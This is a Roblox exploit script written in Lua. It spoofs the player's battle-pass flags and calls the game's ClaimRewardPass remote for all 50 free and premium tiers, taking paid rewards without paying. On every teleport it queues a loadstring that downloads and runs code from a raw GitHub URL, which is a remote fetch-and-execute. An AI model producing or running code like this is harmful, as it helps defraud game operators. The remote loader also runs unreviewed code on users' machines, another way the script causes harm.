if queue_on_teleport then
    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/urban-octo-fishstick/main/supersecretscripts.lua"))()')
end

game:GetService("Players").LocalPlayer.Data.hasPass.Value = true
game:GetService("Players").LocalPlayer.Data.PassTier.Value = 50

local a = 0

for i = 1, 50 do
    task.spawn(function()
        local args = {
            [1] = i,
            [2] = "Free"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("ClaimRewardPass"):InvokeServer(unpack(args))
        
        local args2 = {
            [1] = i,
            [2] = "Premium"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("ClaimRewardPass"):InvokeServer(unpack(args2))
    end)
    a += 1
    task.wait()
end

repeat task.wait() until a == 50
game:GetService('TeleportService'):Teleport(game.PlaceId)
